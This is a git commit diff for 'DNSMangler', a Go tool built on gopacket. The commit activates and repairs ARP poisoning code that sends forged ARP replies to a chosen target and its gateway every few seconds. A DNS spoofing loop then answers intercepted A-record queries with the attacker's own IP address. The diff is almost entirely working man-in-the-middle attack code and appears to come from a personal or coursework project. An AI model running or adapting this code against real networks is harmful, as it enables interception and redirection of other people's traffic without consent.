f390f3b7451e31c9795ad72dc3794ea1cc95ac41
razc411 <razc411@hotmail.ca>
2015-11-09 00:22:21 -0800

    Parse IP incorrectly working, damn you gopher, finished.

--- main.go
+++ main.go
@@ -21,15 +21,15 @@ var (
 func main(){
 
 	targetPtr := flag.String("targ", "127.0.0.1", "The address of the host for spoofing.");
-	//targetMAC := flag.String("tMac", "FF:FF:FF:FF:FF:FF", "The target mac address.");
+	targetMAC := flag.String("targm", "FF:FF:FF:FF:FF:FF", "The target mac address.");
 	interfacePtr := flag.String("iface", "eth0", "The interface for the backdoor to monitor for incoming connection, defaults to eth0.");
-	//gatewayPtr := flag.String("gw", "127.0.0.1", "Sets the gateway to poison.");
-	//gatewayMAC := flag.String("gwMAC", "FF:FF:FF:FF:FF:FF", "Sets the gateway MAC address.");
-	
+	gatewayPtr := flag.String("gw", "127.0.0.1", "Sets the gateway to poison.");
+	gatewayMAC := flag.String("gwm", "FF:FF:FF:FF:FF:FF", "Sets the gateway MAC address.");
+
 	flag.Parse();
 
 	fmt.Print("Welcome to the DNSMangler!\n");
-	handle, err = pcap.OpenLive(*interfacePtr, 1600, true, pcap.BlockForever);
+	handle, err = pcap.OpenLive(*interfacePtr, 1600, false, pcap.BlockForever);
 	checkError(err)
 
 	err = handle.SetBPFFilter("dst port 53")
@@ -39,54 +39,66 @@ func main(){
 
 	macAddr, ipAddr = grabAddresses(*interfacePtr)
 	target = *targetPtr
-	
-	//go arpPoison(*targetPtr, *targetMAC, *gatewayPtr, *gatewayMAC, handle);
+
+	go arpPoison(*targetMAC, *gatewayPtr, *gatewayMAC);
 	mangleDNS();
 }
 
-func arpPoison(target, targetMAC, gateway, gatewayMAC string){
-	
-	ethernetPacket := layers.Ethernet{};
-	ethernetPacket.DstMAC, _ = net.ParseMAC(targetMAC); 
-	ethernetPacket.SrcMAC = macAddr 
-	
-	arpPacket := layers.ARP{};
-	arpPacket.AddrType = layers.LinkTypeEthernet;
-	arpPacket.Protocol = layers.EthernetTypeARP;
-	arpPacket.HwAddressSize = 6;
-	arpPacket.ProtAddressSize = 4;
-	arpPacket.Operation = 2;
+func arpPoison(targetMAC, gateway, gatewayMAC string){
 
-	arpPacket.SourceHwAddress = macAddr;
-	arpPacket.SourceProtAddress = net.IP(ipAddr);
-	arpPacket.DstHwAddress, err = net.ParseMAC("FF:FF:FF:FF:FF:FF");
-	arpPacket.DstProtAddress = net.IP(target);
+	// i lost my mind over this, the parseip function is broke and adds a bucket of worthless
+	// bytes to the beginning of the array, I wish I did this in C
+	// I GUESS I DID C
+	gw := (net.ParseIP(gateway))[12:]
+	tg := (net.ParseIP(target))[12:]
+	tgm, _ := net.ParseMAC(targetMAC)
+	gwm, _ := net.ParseMAC(gatewayMAC)
 
-	gwEthernetPacket := ethernetPacket;
+	fmt.Printf("GateWay IP:%s\nTarget IP:%s\nGateway MAC:%s\nTarget MAC:%s\n", gateway, target, gatewayMAC, targetMAC)
+
+	ethernetPacket := layers.Ethernet{}
+	ethernetPacket.DstMAC = tgm
+	ethernetPacket.SrcMAC = macAddr
+	ethernetPacket.EthernetType = layers.EthernetTypeARP
+
+	arpPacket := layers.ARP{}
+	arpPacket.AddrType = layers.LinkTypeEthernet
+	arpPacket.Protocol = 0x0800
+	arpPacket.HwAddressSize = 6
+	arpPacket.ProtAddressSize = 4
+	arpPacket.Operation = 2
+
+	arpPacket.SourceHwAddress = macAddr
+	arpPacket.SourceProtAddress = gw
+	arpPacket.DstHwAddress = tgm
+	arpPacket.DstProtAddress = tg
+
+	gwEthernetPacket := ethernetPacket
 	gwARPPacket := arpPacket;
-	
-	gwARPPacket.DstHwAddress = net.IP(gateway);
-	gwEthernetPacket.DstMAC, err = net.ParseMAC(gatewayMAC);
+
+	gwARPPacket.SourceProtAddress = tg
+	gwARPPacket.DstHwAddress = gwm
+	gwARPPacket.DstProtAddress = gw
 
 	for {
 		//poison target
-		writePoison(arpPacket, ethernetPacket);
+		writePoison(arpPacket, ethernetPacket)
+		time.Sleep(1 * time.Second)
 		//poison gateway
-		writePoison(gwARPPacket, gwEthernetPacket);
-
-		time.Sleep(1 * time.Second);
+		writePoison(gwARPPacket, gwEthernetPacket)
+		time.Sleep(5 * time.Second)
 	}
-		
+
 }
 
 func writePoison(arpPacket layers.ARP, etherPacket layers.Ethernet){
 	buf := gopacket.NewSerializeBuffer();
 	opts := gopacket.SerializeOptions{};
-	
+
 	gopacket.SerializeLayers(buf, opts, &etherPacket, &arpPacket);
 	packetData := buf.Bytes();
-	
-	err := handle.WritePacketData(packetData);
+
+	err := handle.WritePacketData(packetData[:42]);
 	checkError(err);
 }
 
@@ -96,13 +108,13 @@ func mangleDNS(){
 	var ipLayer       layers.IPv4
 	var dnsLayer      layers.DNS
 	var udpLayer      layers.UDP
-	
+
 	decoder := gopacket.NewDecodingLayerParser(layers.LayerTypeEthernet, &ethernetLayer, &ipLayer, &udpLayer, &dnsLayer)
 	decoded := make([]gopacket.LayerType, 0, 4)
-	
+
 	packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
 	for {
-		packet, err := packetSource.NextPacket() 
+		packet, err := packetSource.NextPacket()
 		checkError(err)
 
 		err = decoder.DecodeLayers(packet.Data(), &decoded)
@@ -119,33 +131,21 @@ func mangleDNS(){
 			continue
 		}
 
-		err = decoder.DecodeLayers(buffer, &decoded)
-		checkError(err)
-		for i := range decoded {
-			fmt.Println(decoded[i])
-		}
-
-		fmt.Printf("IP src %v\n", ipLayer.SrcIP)
-		fmt.Printf("IP dst %v\n", ipLayer.DstIP)
-		fmt.Printf("UDP src port: %v\n", udpLayer.SrcPort)
-		fmt.Printf("UDP dst port: %v\n", udpLayer.DstPort)
-		fmt.Printf("DNS Quy count: %v\n", dnsLayer.QDCount)
-		
 		err = handle.WritePacketData(buffer);
 		checkError(err);
 	}
 }
-/* 
+/*
     FUNCTION: handlePacket(ipLayer *layers.IPv4, udpLayer *layers.UDP, port, lport int){
     RETURNS: Nothing
-    ARGUMENTS: 
+    ARGUMENTS:
                 *layers.IPv4 ipLayer - the ip part of the packet recieved
                 *layers.UDP udpLayer - the udp part of the packet recieved
                   int port : port to send data to
                   int lport : port to listen for data on
 
     ABOUT:
-    Performs packet sniffing using gopacket (libpcap). 
+    Performs packet sniffing using gopacket (libpcap).
 */
 func craftAnswer(ethernetLayer *layers.Ethernet, ipLayer *layers.IPv4, dnsLayer *layers.DNS, udpLayer *layers.UDP) []byte {
 
@@ -167,7 +167,7 @@ func craftAnswer(ethernetLayer *layers.Ethernet, ipLayer *layers.IPv4, dnsLayer 
 	udpLayer.DstPort = srcPort
 	err = udpLayer.SetNetworkLayerForChecksum(ipLayer)
 	checkError(err);
-	
+
 	var answer layers.DNSResourceRecord;
 	answer.Type = layers.DNSTypeA
 	answer.Class = layers.DNSClassIN
@@ -175,7 +175,7 @@ func craftAnswer(ethernetLayer *layers.Ethernet, ipLayer *layers.IPv4, dnsLayer 
 	answer.IP = ipAddr
 
 	dnsLayer.QR = true
-	
+
 	for _, q := range dnsLayer.Questions {
 		if q.Type != layers.DNSTypeA || q.Class != layers.DNSClassIN {
 			continue
@@ -186,13 +186,13 @@ func craftAnswer(ethernetLayer *layers.Ethernet, ipLayer *layers.IPv4, dnsLayer 
 		dnsLayer.Answers = append(dnsLayer.Answers, answer)
 		dnsLayer.ANCount = dnsLayer.ANCount + 1
 	}
-	
+
 	buf := gopacket.NewSerializeBuffer();
 	opts := gopacket.SerializeOptions{
 		FixLengths: true,
 		ComputeChecksums: true,
 	};
-	
+
 	err = gopacket.SerializeLayers(buf, opts, ethernetLayer, ipLayer, udpLayer, dnsLayer);
 	checkError(err);
 
